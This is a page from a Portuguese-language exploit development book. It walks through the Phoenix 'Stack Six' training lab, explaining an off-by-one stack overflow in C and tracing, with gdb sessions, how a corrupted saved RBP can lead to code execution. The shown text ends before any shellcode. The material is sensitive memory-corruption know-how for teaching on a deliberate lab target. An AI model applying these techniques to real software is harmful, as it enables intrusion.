<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Stack Six - Um Livrinho Sobre Exploit Dev</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <base href="../../">

        <link rel="stylesheet" href="book.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <link rel="shortcut icon" href="favicon.png">

        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme -->
        

        

        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
        <script>
            if (typeof Clipboard == 'undefined') {
                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch JQuery from CDN but have a local fallback -->
        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script>
            if (typeof jQuery == 'undefined') {
                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
        <script src="store.js"></script>

    </head>
    <body class="light">
        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme = store.get('mdbook-theme');
            if (theme === null || theme === undefined) { theme = 'light'; }
            $('body').removeClass().addClass(theme);
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var sidebar = store.get('mdbook-sidebar');
            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
        </script>

        <div id="sidebar" class="sidebar">
            <ul class="chapter"><li><a href="./aventura.html"><strong>1.</strong> Aventura</a></li><li class="spacer"></li><li><a href="./stack/phoenix/setup.html"><strong>2.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>2.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>2.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>2.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>2.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>2.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>2.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html" class="active"><strong>2.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>3.</strong> Mitigações</a></li><li><strong>4.</strong> from pwn import *</li><li><a href="./stack/ret2libc/intro.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Protostar Stack Six: ret2libc</li><li><strong>5.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><strong>6.</strong> Estilo OSCP</li><li><ul class="section"><li><strong>6.1.</strong> Brainpan</li><li><strong>6.2.</strong> Tib3rius BOF Prep</li></ul></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><strong>7.1.</strong> Sua primeira chain e Primitivos</li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><strong>7.2.1.</strong> ROPE: pivot</li></ul></li><li><strong>7.3.</strong> ROP + ret2libc</li><li><strong>7.4.</strong> SigROP</li></ul></li><li><strong>8.</strong> Derrotando ASLR</li><li><strong>9.</strong> Derrotando Canaries</li><li class="spacer"></li><li><strong>10.</strong> Phoenix: Format</li><li class="spacer"></li><li><strong>11.</strong> Teoria</li><li><strong>12.</strong> Básico</li><li><ul class="section"><li><strong>12.1.</strong> Fastbins Dup</li><li><a href="./heap/basico/HouseOfForce.html"><strong>12.2.</strong> House of Force</a></li><li><strong>12.3.</strong> Unsafe Unlink</li><li><strong>12.4.</strong> Safe Unlink</li><li><strong>12.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>12.6.</strong> Chunk Faking</li></ul></li><li><strong>13.</strong> Intermediário</li><li><ul class="section"><li><strong>13.1.</strong> House of Orange</li><li><ul class="section"><li><strong>13.1.1.</strong> Heap Extension</li><li><strong>13.1.2.</strong> Vtable + File Stream Exploitation</li><li><strong>13.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>13.2.</strong> House of Spirit</li></ul></li><li><strong>14.</strong> Avançado</li><li><ul class="section"><li><strong>14.1.</strong> House of Rust</li><li class="spacer"></li></ul></li><li><strong>15.</strong> Intro AFL</li></ul>
        </div>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page" tabindex="-1">
                
                <div id="menu-bar" class="menu-bar">
                    <div class="left-buttons">
                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html">
                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                        </a>
                    </div>
                </div>

                <div id="content" class="content">
                    <ul>
<li><a href="./stack/phoenix/StackSix.html#-dicas">💡 Dicas</a></li>
<li><a href="./stack/phoenix/StackSix.html#-explica%C3%A7%C3%A3o">🛸 Explicação</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#analisando-o-programa">Analisando o programa</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#main">main</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#dica">Dica</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackSix.html#greet">greet</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackSix.html#analisando-o-programa-asm">Analisando o programa (ASM)</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#main-1">main</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackSix.html#fuzz">Fuzz</a></li>
<li><a href="./stack/phoenix/StackSix.html#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#curiosidade">Curiosidade</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackSix.html#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execução de código</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="./stack/phoenix/StackSix.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#o-que-controlamos">O que controlamos?</a>
<ul>
<li><a href="./stack/phoenix/StackSix.html#setup">Setup</a></li>
<li><a href="./stack/phoenix/StackSix.html#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
<li><a href="./stack/phoenix/StackSix.html#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></li>
<li><a href="./stack/phoenix/StackSix.html#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackSix.html#shellcode">Shellcode</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackSix.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<a class="header" href="./stack/phoenix/StackSix.html#-dicas" id="-dicas"><h1>💡 Dicas</h1></a>
<p>Off-by-one BOF</p>
<a class="header" href="./stack/phoenix/StackSix.html#-explicação" id="-explicação"><h1>🛸 Explicação</h1></a>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \
Esse processo de gerar as mensagens é vulnerável a buffer overflow!</p>
<a class="header" href="./stack/phoenix/StackSix.html#analisando-o-programa" id="analisando-o-programa"><h2>Analisando o programa</h2></a>
<a class="header" href="./stack/phoenix/StackSix.html#main" id="main"><h3>main</h3></a>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main começa definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verificações relacionadas à arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamada <code>NOME</code> existe.</p>
<p>Isso é usado para tornar o inicio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos não a encontramos no código fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binário:
<img src="./img/stack_six/Messages_ARCH.png" alt="Diferença entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, é checado se ptr é NULL (a env var não existe)</p>
<p>Caso não exista: usa a função errx() para interromper a execução com uma mensagem de erro! errx() recebe 2 argumento: (código_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // Código de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o código retornado pelo ultimo programa
<img src="./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> é chamada, e o valor retornado por ela é printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<a class="header" href="./stack/phoenix/StackSix.html#dica" id="dica"><h4>Dica</h4></a>
<p>Para definir uma env var no gdb</p>
<p><img src="./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<a class="header" href="./stack/phoenix/StackSix.html#greet" id="greet"><h3>greet</h3></a>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir terminação com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulnerável! D:</p>
<p>A função <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>São definidas duas variáveis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho máximo)</p>
<p>O tamanho de <code>who</code> é salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers são terminados com um NULL byte, portanto um buffer[128] só armazena 127 letras!</p>
</blockquote>
<p>Em seguida, é checado se <code>maxSize</code> é maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser definido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize é 127</p>
</blockquote>
<p>Essa é uma tentativa de prevenir o buffer overflow! Pois, só seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem não leva em consideração o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>Então nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do código que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho!
Caso nos conseguíssemos controlar what, poderíamos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) é similar a <code>strcpy</code>, mas recebe um terceiro parâmetro: tamanho!</p>
<p>Esse tamanho é limitado à 127 (limite de <code>maxSize</code>), então teoricamente não seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio é 34 bytes (na versão amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>Então se não fosse pelo inicio da mensagem, não seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<a class="header" href="./stack/phoenix/StackSix.html#analisando-o-programa-asm" id="analisando-o-programa-asm"><h2>Analisando o programa (ASM)</h2></a>
<a class="header" href="./stack/phoenix/StackSix.html#main-1" id="main-1"><h3>main</h3></a>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1º argumento é &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; também deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a comparação anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos não emitimos erro

Essa parte só executa caso ExploitEducation não exista {
        mov    esi,0x4008d8               ; 2º argumento
        mov    edi,0x1                    ; 1º argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Interrompe a execução e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1º argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1º argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o código fonte!</p>
<p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o código fonte por treino :D</p>
<a class="header" href="./stack/phoenix/StackSix.html#fuzz" id="fuzz"><h2>Fuzz</h2></a>
<p>Agora que sabemos que é possível realizar o overflow, vamos ver o que é corrompido :D</p>
<p>Nos só podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: então <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no inicio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<a class="header" href="./stack/phoenix/StackSix.html#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as"><h2>E vamos rodar com 127 As:</h2></a>
<p>Obs:</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas não funciona sei la por que :(</p>
<p>Então eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!!</p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endereço de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endereço: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg é só para a formatação ficar legível! Significa e<strong>X</strong>tra <strong>G</strong>rande (que é o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack são: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execução <code>c</code>, e ver se eles se alteram (lembrando greet é vulnerável)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que nós conseguimos controlar o últimos byte do rbp salvo! Esse ultimo byte constuma ser
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow é um <code>BoF</code> que corrompe o <code>LSB</code>, ou como é mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow é bem comum: vão esquecer de que o buffer termina com um <code>0x00</code> e vão comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<a class="header" href="./stack/phoenix/StackSix.html#curiosidade" id="curiosidade"><h4>Curiosidade</h4></a>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as variáveis em uma posição,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não necessariamente é o rbp!
E esse é o nosso caso: existem outras variáveis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaço!</p>
<p>Caso a mensagem fosse 1 byte maior, poderíamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiríamos controlar o rbp!</p>
<p>E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderíamos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! É o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de código</strong></p>
<p>Na vida real, caso não existisse essa mensagem, só conseguiríamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp,
isto é: não existe nenhuma outra variável, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, nós nao conseguiríamos alterar RBP nem RIP,
portanto seria impossível conseguir execução de código :(

O máximo que conseguimos fazer é corromper 1 byte de uma variável!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras variáveis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: não acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela variável poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<a class="header" href="./stack/phoenix/StackSix.html#como-ir-de-off-by-one-para-execução-de-código" id="como-ir-de-off-by-one-para-execução-de-código"><h2>Como ir de off-by-one para execução de código</h2></a>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>Então esse rbp que estamos alterando é o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execução normalmente, na sua ultima instrução (<code>ret</code>) a magica acontece</p>
<a class="header" href="./stack/phoenix/StackSix.html#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido"><h3>Ret com um RBP corrompido</h3></a>
<p>resumindo, ret é um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, então +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para código que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>!
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execução :D</p>
<a class="header" href="./stack/phoenix/StackSix.html#-exploit" id="-exploit"><h1>🔥 Exploit</h1></a>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que região podemos apontar rbp</li>
<li>Encontrar um pointer nessa região que aponte para a parte que controlamos</li>
</ol>
<a class="header" href="./stack/phoenix/StackSix.html#o-que-controlamos" id="o-que-controlamos"><h2>O que controlamos?</h2></a>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input é passado pelas env vars... portanto podemos falar que a unica região da memoria que
controlamos são as env vars</p>
<p>E qual é essa região? Vamos encontrar :D</p>
<a class="header" href="./stack/phoenix/StackSix.html#setup" id="setup"><h3>Setup</h3></a>
<p>As envs são diferentes dentro do gdb, nós podemos comparar usando</p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferença é: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferença, e garantir que todos endereços estão certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se você sair do gdb elas vão resetar!
</code></pre>
<a class="header" href="./stack/phoenix/StackSix.html#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos"><h3>Descobrir que partes da memoria controlamos</h3></a>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endereço e printando!</p>
<p><img src="./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente é o inicio das envs, no nosso caso é :D</p>
</blockquote>
<p><img src="./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<a class="header" href="./stack/phoenix/StackSix.html#encontrar-para-que-região-podemos-apontar-rbp" id="encontrar-para-que-região-podemos-apontar-rbp"><h3>Encontrar para que região podemos apontar rbp</h3></a>
<p>Nesse caso é fácil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<a class="header" href="./stack/phoenix/StackSix.html#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos"><h3>Encontrar um pointer nessa região que aponte para a parte que controlamos</h3></a>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a região da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela região da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword são 8 bytes, assim, 32 qwords são 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa região</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endereços, precisamos encontrar um que tenha um <strong>pointer que aponte para a região da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endereços da região que controlamos começam com <code>0x7fffffff</code>, então esse ja é um bom começo</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500│+0x0000 0x0000000000000001
0x00007fffffffe508│+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510│+0x0010 0x00007ffff7ffc948
0x00007fffffffe518│+0x0018 0x00000000000000a6
0x00007fffffffe520│+0x0020 0x00007fffffffe57f
0x00007fffffffe528│+0x0028 0x0000000000000001
0x00007fffffffe530│+0x0030 0x4141414141414141
0x00007fffffffe538│+0x0038 0x00007ffff7ffb300
0x00007fffffffe540│+0x0040 0x0000000000000000
0x00007fffffffe548│+0x0048 0x0000000000600c00
0x00007fffffffe550│+0x0050 0x000000000040079b
0x00007fffffffe558│+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda não o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e não no endereço</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos só levando os valores em consideração! Para facilitar, também podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
